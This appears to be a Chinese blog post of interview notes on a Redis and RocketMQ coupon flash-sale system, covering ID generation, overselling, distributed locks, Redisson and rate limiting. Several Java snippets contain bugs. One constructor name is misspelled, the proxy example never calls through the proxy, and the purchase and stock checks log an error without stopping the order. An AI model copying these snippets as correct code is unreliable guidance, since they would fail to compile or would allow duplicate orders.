<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisIDWorker</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 开始时间戳，20220101</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BEGIN_STAMP</span> <span class="operator">=</span> <span class="number">1640995200L</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 序列号位数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">COUNT_BITS</span> <span class="operator">=</span> <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate stringRedisTemplate;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RedisIDWorker</span><span class="params">(StringRedisTemplate stringRedisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.stringRedisTemplate = stringRedisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">nextId</span><span class="params">(String keyPrefix)</span> &#123;</span><br><span class="line">        <span class="comment">//1. 生成时间戳</span></span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">now</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line">        <span class="type">long</span> <span class="variable">nowSecond</span> <span class="operator">=</span> now.toEpochSecond(ZoneOffset.UTC);</span><br><span class="line">        <span class="type">long</span> <span class="variable">timeStamp</span> <span class="operator">=</span> nowSecond - BEGIN_STAMP;</span><br><span class="line">        <span class="comment">//2. 生成序列号</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">date</span> <span class="operator">=</span> now.format(DateTimeFormatter.ofPattern(<span class="string">&quot;yyyyMMdd&quot;</span>));</span><br><span class="line">        <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().increment(<span class="string">&quot;icr:&quot;</span> + keyPrefix + <span class="string">&quot;:&quot;</span> + date);</span><br><span class="line">        System.out.println(<span class="string">&quot;icr:&quot;</span> + keyPrefix + <span class="string">&quot;:&quot;</span> + date);</span><br><span class="line">        <span class="keyword">return</span> timeStamp &lt;&lt; COUNT_BITS | count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>补充：</p>
<ul>
<li><p>全局ID生成器，是一种在分布式系统下用来生成全局唯一ID的工具，一般需要满足：</p>
<ul>
<li>唯一性</li>
<li>高可用</li>
<li>高性能</li>
<li>递增性</li>
<li>安全性</li>
</ul>
</li>
<li><p>常见全局唯一ID生成策略：</p>
<ul>
<li>UUID</li>
<li>Redis自增：时间戳 + 计数器</li>
<li>雪花算法</li>
<li>数据库自增</li>
</ul>
</li>
</ul>
<h1 id="5-如何解决超卖问题？"><a href="#5-如何解决超卖问题？" class="headerlink" title="5. 如何解决超卖问题？"></a>5. 如何解决超卖问题？</h1><p>项目中参考乐观锁的思想解决超卖问题。一开始是以CAS的方式，扣减库存的时候判断库存和之前读出来的值是否一致，如果一致就可以正常扣减，如果不一致就不能扣减，实际应用中发现会有很多请求失败，因为扣减库存的时候发现和原来读的值不一样，结合实际业务需求，简化成只要大于0就可以成功扣减。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//乐观锁解决超卖</span></span><br><span class="line"><span class="comment">//原实现，请求失败率高</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">  .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>)</span><br><span class="line">  .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).eq(<span class="string">&quot;stock&quot;</span>, voucher.getStock()).update();</span><br><span class="line"></span><br><span class="line"><span class="comment">//简化后</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">                .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>)</span><br><span class="line">                .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>).update();</span><br></pre></td></tr></table></figure>

<p>补充：</p>
<ul>
<li><p>悲观锁：添加同步锁，让线程串行执行</p>
<ul>
<li><p>优点：简单粗暴</p>
</li>
<li><p>缺点：性能一般</p>
</li>
</ul>
</li>
<li><p>乐观锁：不加锁，在更新数据时比较数据是否被修改过</p>
<ul>
<li><p>CAS、版本号</p>
</li>
<li><p>优点：性能好</p>
</li>
<li><p>缺点：存在成功率低的问题</p>
</li>
</ul>
</li>
</ul>
<h1 id="6-怎么解决一人一单问题？"><a href="#6-怎么解决一人一单问题？" class="headerlink" title="6. 怎么解决一人一单问题？"></a>6. 怎么解决一人一单问题？</h1><p><strong>单体情况下：</strong></p>
<ul>
<li>采用用悲观锁的方式，对同一用户userId.toString().intern()加synchronized关键字，确保同一用户的请求是串行执行，减少了锁定资源的范围，一定程度上提高了项目的并发性（加在方法上锁的是当前实例，变成所有用户都得串行执行）</li>
<li>注意点一：加锁的范围没有包括整个事务，导致synchronized代码块执行完退出后，事务还没有提交，此时新的线程又进入到synchronized代码块，所以应该锁整个方法</li>
<li>注意点二：还有一个问题是当使用return createVoucherOrder(voucherId)直接调用的是this的方法，由于Spring的事务是通过代理对象来实现的，所以会导致事务失效，应此应该调用代理对象的的方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用synchronized实现一人一单</span></span><br><span class="line"><span class="comment">//存在线程安全问题，synchronized代码块执行完退出后，事务还没有提交</span></span><br><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">createVoucherOrder</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> query().eq(<span class="string">&quot;user_id&quot;</span>, userId).eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).count();</span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;已经购买过一次&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">synchronized</span> (userId.toString().intern()) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">                .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>)</span><br><span class="line">                .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>).update();</span><br><span class="line">        <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;库存不足&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">VoucherOrder</span> <span class="variable">voucherOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VoucherOrder</span>();</span><br><span class="line">        <span class="type">long</span> <span class="variable">orderId</span> <span class="operator">=</span> redisIDWorker.nextId(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">        voucherOrder.setId(orderId);</span><br><span class="line">        voucherOrder.setUserId(userId);</span><br><span class="line">        voucherOrder.setVoucherId(voucherId);</span><br><span class="line">        save(voucherOrder);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Result.ok(orderId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加锁到整个事务，存在事务失效的问题</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">seckillVoucher</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">	<span class="comment">//判断秒杀是否开始、是否结束、判断库存是否充足</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUSer().getId();</span><br><span class="line">  <span class="keyword">synchronized</span> (userId.toString().intern()) &#123;</span><br><span class="line">    <span class="keyword">return</span> createVoucherOder(voucherId);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">createVoucherOrder</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> query().eq(<span class="string">&quot;user_id&quot;</span>, userId).eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).count();</span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;已经购买过一次&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">            .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>)</span><br><span class="line">            .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>).update();</span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;库存不足&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">VoucherOrder</span> <span class="variable">voucherOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VoucherOrder</span>();</span><br><span class="line">    <span class="type">long</span> <span class="variable">orderId</span> <span class="operator">=</span> redisIDWorker.nextId(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">    voucherOrder.setId(orderId);</span><br><span class="line">    voucherOrder.setUserId(userId);</span><br><span class="line">    voucherOrder.setVoucherId(voucherId);</span><br><span class="line">    save(voucherOrder);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Result.ok(orderId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用当前类的代理类</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">seckillVoucher</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">	<span class="comment">//判断秒杀是否开始、是否结束、判断库存是否充足</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUSer().getId();</span><br><span class="line">  <span class="keyword">synchronized</span> (userId.toString().intern()) &#123;</span><br><span class="line">    <span class="comment">//获取事务有关的代理对象</span></span><br><span class="line">    <span class="type">IVoucherOrderService</span> <span class="variable">proxy</span> <span class="operator">=</span> (IVoucherOrderService) AopContext.currentProxy();</span><br><span class="line">    <span class="keyword">return</span> createVoucherOder(voucherId);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>集群情况下：使用分布式锁</strong></p>
<h1 id="7-你是如何实现分布式锁的？"><a href="#7-你是如何实现分布式锁的？" class="headerlink" title="7. 你是如何实现分布式锁的？"></a>7. 你是如何实现分布式锁的？</h1><p>主要是使用Redis的setnx命令来实现分布式锁的。setnx是互斥的，可以设置超时时间，当要set的key已经存在的时候，set就会失败，key不存在时才会成功，对应的方法是setIfAbsent。 </p>
<p>自己实现的分布式锁有两个核心方法，<strong>获取锁tryLock</strong>和<strong>释放锁unlock</strong>。获取锁的时候是互斥、非阻塞的，尝试一次，成功就返回true，失败就返回false。释放锁有两种方式，手动调用unlock释放或者当setnx时设置的超时时间到会自动释放。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleRedisLock</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate stringRedisTemplate;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;lock:&quot;</span>;</span><br><span class="line">  	<span class="keyword">public</span> <span class="title function_">SimpleRedisLocl</span><span class="params">(String name, StringRedisTemplate stringRedisTemplate)</span> &#123;</span><br><span class="line">    	<span class="built_in">this</span>.name = name;</span><br><span class="line">    	<span class="built_in">this</span>.stringRedisTemplate = stringRedisTemplate;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> timeoutSec)</span> &#123;</span><br><span class="line">    	<span class="comment">//获取线程标识</span></span><br><span class="line">    	<span class="type">long</span> <span class="variable">threadId</span> <span class="operator">=</span> Thread.currentThread().getId();</span><br><span class="line">    	<span class="comment">//获取锁</span></span><br><span class="line">    	<span class="type">Boolean</span> <span class="variable">success</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().setIfAbsent(KEY_PREFIX + name, threadId + <span class="string">&quot;&quot;</span>, timeoutSec);</span><br><span class="line">    </span><br><span class="line">    	<span class="keyword">return</span> Boolean.TRUE.equals(success);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">    	stringRedisTemplate.delete(KEY_PREFIX + name);</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-1-自定义分布式锁的误删问题"><a href="#7-1-自定义分布式锁的误删问题" class="headerlink" title="7.1 自定义分布式锁的误删问题"></a>7.1 自定义分布式锁的误删问题</h2><p>自定义的分布式锁可能存在误删的问题，比如线程1在获取锁后，由于业务操作耗时久或，导致Redis超时释放，此时线程2来获取锁成功了，开始执行业务操作，线程1执行完后释放了Redis锁，但是此时锁已经被线程2获取了，导致线程1释放的是线程2的锁，就出现误删问题。</p>
<p>解决方案是在获取锁时存入线程标示，在释放锁时先获取锁中的线程标识，判断是否和当前线程标识一致，如果一致就释放锁，不一致就不释放锁。</p>
<p>线程不能直接使用线程ID，因为集群模式下容易出现冲突，而是用UUID。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleRedisLock</span> <span class="keyword">implements</span> <span class="title class_">ILock</span> &#123;</span><br><span class="line">  		<span class="comment">//线程标识前缀</span></span><br><span class="line">  		<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ID_PREFIX</span> <span class="operator">=</span> UUID.randomUUID().toString(<span class="literal">true</span>) + <span class="string">&quot;-&quot;</span>;</span><br><span class="line">  		<span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> timeoutSec)</span> &#123;</span><br><span class="line">        <span class="comment">//获取线程标识 前缀 + 线程ID</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">threadId</span> <span class="operator">=</span> ID_PREFIX + Thread.currentThread().getId();</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">success</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().setIfAbsent(KEY_PREFIX + name, threadId, timeoutSec, TimeUnit.SECONDS);</span><br><span class="line">        <span class="keyword">return</span> BooleanUtil.isTrue(success);</span><br><span class="line">    &#125;</span><br><span class="line">  		</span><br><span class="line">  		<span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">threadId</span> <span class="operator">=</span> ID_PREFIX + Thread.currentThread().getId();</span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(KEY_PREFIX + name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//线程标识解决分布式锁误删的问题</span></span><br><span class="line">        <span class="keyword">if</span> (threadId.equals(id)) &#123;</span><br><span class="line">            stringRedisTemplate.delete(KEY_PREFIX + name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="7-2-自定义分布式锁的原子性问题"><a href="#7-2-自定义分布式锁的原子性问题" class="headerlink" title="7.2 自定义分布式锁的原子性问题"></a>7.2 自定义分布式锁的原子性问题</h2><p>解决误删时由于 <strong>判断锁标识是否是自己</strong>和<strong>释放锁</strong> 两步操作不是原子的，还是可能出现误删的问题，所以要借助Lua脚本保证一致性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DefaultRedisScript&lt;Long&gt; UNLOCK_SCRIPT;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    UNLOCK_SCRIPT = <span class="keyword">new</span> <span class="title class_">DefaultRedisScript</span>&lt;&gt;();</span><br><span class="line">    UNLOCK_SCRIPT.setLocation(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;unlock.lua&quot;</span>));</span><br><span class="line">    UNLOCK_SCRIPT.setResultType(Long.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调用lua脚本原子释放锁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">    stringRedisTemplate.execute(</span><br><span class="line">            UNLOCK_SCRIPT,</span><br><span class="line">            Collections.singletonList(KEY_PREFIX + name),</span><br><span class="line">            ID_PREFIX + Thread.currentThread().getId());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//unlock.lua</span></span><br><span class="line">--比较线程标示与锁中的标示是否一致</span><br><span class="line"><span class="keyword">if</span> (redis.call(<span class="string">&#x27;get&#x27;</span>,KEYS[<span class="number">1</span>]) == ARGV[<span class="number">1</span>]) then</span><br><span class="line">    -- 释放锁 del key</span><br><span class="line">    <span class="keyword">return</span> redis.call(<span class="string">&#x27;del&#x27;</span>,KEYS[<span class="number">1</span>])</span><br><span class="line">end</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>补充：</p>
<p>分布式锁特点：</p>
<ul>
<li>多进程可见</li>
<li>互斥</li>
<li>高可用</li>
<li>高性能</li>
<li>安全性</li>
</ul>
<h2 id="7-3-基于setnx实现的分布式锁的问题"><a href="#7-3-基于setnx实现的分布式锁的问题" class="headerlink" title="7.3 基于setnx实现的分布式锁的问题"></a>7.3 基于setnx实现的分布式锁的问题</h2><ol>
<li>不可重入，同一个线程无法多次获取同一把锁</li>
<li>不可重试，获取锁只尝试一次就返回false，没有重试机制</li>
<li>超时释放，超时释放虽然可以避免死锁，但如果是业务执行耗时较长，也会导致锁释放，存在安全隐患</li>
<li>主从一致性，如果Redis提供了主从集群，主从同步存在延迟，当主宕机时，如果从并同步主中的锁数据，则会出现锁失效</li>
</ol>
<h2 id="7-4-基于ZooKeeper实现分布式锁"><a href="#7-4-基于ZooKeeper实现分布式锁" class="headerlink" title="7.4 基于ZooKeeper实现分布式锁"></a>7.4 基于ZooKeeper实现分布式锁</h2><ul>
<li>基于<strong>临时顺序节点</strong>和**Watcher（事件监听器）**机制</li>
</ul>
<h1 id="8-Redisson有什么功能？"><a href="#8-Redisson有什么功能？" class="headerlink" title="8. Redisson有什么功能？"></a>8. Redisson有什么功能？</h1><p>可重入锁、可重试、锁延时</p>
<h2 id="8-1-Redisson的可重入锁怎么实现的？"><a href="#8-1-Redisson的可重入锁怎么实现的？" class="headerlink" title="8.1 Redisson的可重入锁怎么实现的？"></a><img data-src="https://gitee.com/snailhking/my-picture/raw/master/Image/202403072136332.png" alt="img">8.1 Redisson的可重入锁怎么实现的？</h2><ul>
<li>用hash结构记录线程id和重入次数</li>
<li>获取锁时，判断当前锁是否已被获取过，如果未获取，则锁记录线程标识，同时锁计数加一；如果获取过，判断线程标识是否一致，如果一致则是重入，锁计数加一，重新设置有效期，如果不一致，则获取锁失败</li>
<li>释放锁时，判断锁是否存在，如果存在，判断是否是自己线程，如果是则将锁计数-1，判断是否为0，如果为0就释放锁，并发布消息通知，通知正在等待该锁的线程，不为0则重置有效期</li>
</ul>
<h2 id="8-2-Redisson的锁重试如何实现？"><a href="#8-2-Redisson的锁重试如何实现？" class="headerlink" title="8.2 Redisson的锁重试如何实现？"></a>8.2 Redisson的锁重试如何实现？</h2><ul>
<li>获取锁时可以传入最大等待时间，第一次获取锁失败时，会订阅并等待释放锁的信号，在有效期内锁释放后会发布通知，收到通知后会尝试再次获取锁，又获取失败后，则会根据信号量等待一段时间后再次获取锁，然后外层套while true循环</li>
<li>在这期间会多次比较当前剩余等待时间是否已经超时，如果已经超过最大等待时间，直接返回false；</li>
<li>同时也不会无意义的尝试获取锁，而是通过消息订阅、信号量的方式判断是否能获取锁</li>
</ul>
<h2 id="8-3-Redisson的锁超时怎么解决？"><a href="#8-3-Redisson的锁超时怎么解决？" class="headerlink" title="8.3 Redisson的锁超时怎么解决？"></a>8.3 Redisson的锁超时怎么解决？</h2><ul>
<li>当过期时间设置为-1时，会开启看门狗，释放锁的时候取消watch dog</li>
<li>每隔一段时间，重置超时时间利用超时和续期机制实现逻辑上永不过期，直到业务完成或者业务异常退出</li>
<li>默认超时时间30s，每10s续期一次</li>
</ul>
<h1 id="9-RocketMQ怎么用的？"><a href="#9-RocketMQ怎么用的？" class="headerlink" title="9.RocketMQ怎么用的？"></a>9.RocketMQ怎么用的？</h1><ul>
<li>我是在抢购优惠券的时候使用到的，对于一些大额的优惠券，可能会在短时间内有大量的下单请求，如果这些请求全部落到数据库上，由于并发加锁的问题，会造成接口的性能大幅下降，所以在这个地方我使用了RocketMQ来解耦Redis扣减和数据库扣减。</li>
<li>首先把库存信息缓存到Redis当中，然后直接在Lua脚本中用Redis判断库存容量够不够、当前用户有没有重复购买，如果都校验成功，就先在Redis扣减，然后生成一个订单，加入到消息队列中，此时接口可以直接返回。</li>
<li>消费者再从消息队列中获取订单信息，加锁写到数据库中，实现了流量的削峰。</li>
<li>经过解耦后的接口在本地简单测试性能提升约50%，响应时间500+ms降低至200+ms</li>
</ul>
<h2 id="9-1-如何解决顺序消费？"><a href="#9-1-如何解决顺序消费？" class="headerlink" title="9.1 如何解决顺序消费？"></a>9.1 如何解决顺序消费？</h2><ul>
<li>生产者：单一生产者串行发送</li>
<li>全局有序：可以通过将所有消息路由到同一个队列来实现</li>
<li>局部有序：同一生产者组通过MessageQueueSelector保证消息在同一组</li>
<li>消费者：通过MessageListenerOrderly保证对同一个队列的串行消费</li>
</ul>
<p>当前系统其实只在生成优惠券订单的时候使用了消息队列，下游服务只有将订单保存至数据库，没有其他下游服务，所以也就不存在需要保证顺序消费的情况，因为所有订单之间都是无序的。当然如果业务扩展，以后下游有多个服务时，可以通过Hash取模的方法把同一系列的消息放到同一个消息队列中，因为相同的消息队列消费的顺序是有序的，所以就保证了顺序消费</p>
<h2 id="9-2-如何解决消息丢失问题"><a href="#9-2-如何解决消息丢失问题" class="headerlink" title="9.2 如何解决消息丢失问题"></a>9.2 如何解决消息丢失问题</h2><ul>
<li>生产者：<ul>
<li>同步：确保成功发送给消息队列才执行后续代码，可以放在同一个本地事务中</li>
<li>异步 + 重试 + 补偿：写入消息队列不阻塞，通过回调如果写入失败就重试，如果重试超过3次，就记录到数据库后续补偿</li>
</ul>
</li>
<li>broker：<ul>
<li>异步刷盘宕机时内存中的消息丢失</li>
<li>同步刷盘：写入到磁盘中再返回给生产者成功</li>
<li>同步复制：同步复制给从节点</li>
</ul>
</li>
<li>消费者<ul>
<li>重试 + 幂等性 + 死信队列</li>
<li>减轻单节点负担</li>
</ul>
</li>
</ul>
<h2 id="9-2-如何解决重复消费"><a href="#9-2-如何解决重复消费" class="headerlink" title="9.2 如何解决重复消费"></a>9.2 如何解决重复消费</h2><ul>
<li>什么时候出现重复消费：消费者消费超时，没有给broker返回ACK，broker此时会重新投递</li>
<li>存入Redis，并把状态设置为消费中</li>
</ul>
<p>解决重复消费是我把保存订单至数据库的服务设计成幂等的，对于重复的订单，在插入数据库时如果订单ID相同会插入失败。</p>
<h2 id="9-3-如何解决消息堆积"><a href="#9-3-如何解决消息堆积" class="headerlink" title="9.3 如何解决消息堆积"></a>9.3 如何解决消息堆积</h2><p>水平扩展消费者数量，检查是否有消费错误、是否有线程卡死，增加消费者数量的同时需要增加主题的队列数。</p>
<h2 id="9-4-如何保证高性能读写"><a href="#9-4-如何保证高性能读写" class="headerlink" title="9.4 如何保证高性能读写"></a>9.4 如何保证高性能读写</h2><p>传统IO需要多次用户态内核态切换，以及数据拷贝，RocketMQ使用零拷贝的计数，将内核缓冲区和Socket缓冲区共享，减少一次拷贝操作</p>
<h2 id="9-3-消息队列还有哪些用处？"><a href="#9-3-消息队列还有哪些用处？" class="headerlink" title="9.3 消息队列还有哪些用处？"></a>9.3 消息队列还有哪些用处？</h2><p>可以用来实现分布式事务，数据库binlog日志同步</p>
<h2 id="9-4-如何保证消息被成功消费，如果消费失败呢？"><a href="#9-4-如何保证消息被成功消费，如果消费失败呢？" class="headerlink" title="9.4 如何保证消息被成功消费，如果消费失败呢？"></a>9.4 如何保证消息被成功消费，如果消费失败呢？</h2><h2 id="其他的中间件消息队列你知道哪些？"><a href="#其他的中间件消息队列你知道哪些？" class="headerlink" title="其他的中间件消息队列你知道哪些？"></a>其他的中间件消息队列你知道哪些？</h2><p>用消息队列可以降低系统耦合性、实现任务异步、有效地进行流量削峰，是分布式和微服务系统中重要的组件之一.</p>
<ul>
<li>RabbitMQ 在吞吐量方面虽然稍逊于 Kafka、RocketMQ 和 Pulsar，但是由于它基于 Erlang 开发，所以并发能力很强，性能极其好，延时很低，达到微秒级。但是也因为 RabbitMQ 基于 Erlang 开发，所以国内很少有公司有实力做 Erlang 源码级别的研究和定制。如果业务场景对并发量要求不是太高（十万级、百万级），那这几种消息队列中，RabbitMQ 或许是你的首选。</li>
<li>RocketMQ 和 Pulsar 支持强一致性，对消息一致性要求比较高的场景可以使用。</li>
<li>RocketMQ 阿里出品，Java 系开源项目，源代码我们可以直接阅读，然后可以定制自己公司的 MQ，并且 RocketMQ 有阿里巴巴的实际业务场景的实战考验。</li>
<li>Kafka 的特点其实很明显，就是仅仅提供较少的核心功能，但是提供超高的吞吐量，ms 级的延迟，极高的可用性以及可靠性，而且分布式可以任意扩展。同时 Kafka 最好是支撑较少的 topic 数量即可，保证其超高吞吐量。Kafka 唯一的一点劣势是有可能消息重复消费，那么对数据准确性会造成极其轻微的影响，在大数据领域中以及日志采集中，这点轻微影响可以忽略这个特性天然适合大数据实时计算以及日志收集。如果是大数据领域的实时计算、日志采集等场景，用 Kafka 是业内标准的，绝对没问题，社区活跃度很高，绝对不会黄，何况几乎是全世界这个领域的事实性规范。</li>
</ul>
<p>![image-20250311115801061](&#x2F;Users&#x2F;effy&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20250311115801061.png)</p>
<h1 id="10-限流是怎么实现的？"><a href="#10-限流是怎么实现的？" class="headerlink" title="10. 限流是怎么实现的？"></a>10. 限流是怎么实现的？</h1><ul>
<li>首先是自定义了一个注解，主要是两个属性type是被限流的key，count表明这个key每秒最大的请求数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(value = ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(value = RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> RateConfigAnno &#123;</span><br><span class="line">    String <span class="title function_">limitType</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">limitCount</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">5d</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>然后是写了一个切面，拦截所有被RateConfigAnno注解的方法，在方法执行前调用Google Guava的RateLimiter，获取这个key下的limiter，如果能成功获取到令牌就继续执行被拦截方法的业务逻辑，如果获取失败就直接返回限流信息，不再继续执行后续业务。</li>
</ul>
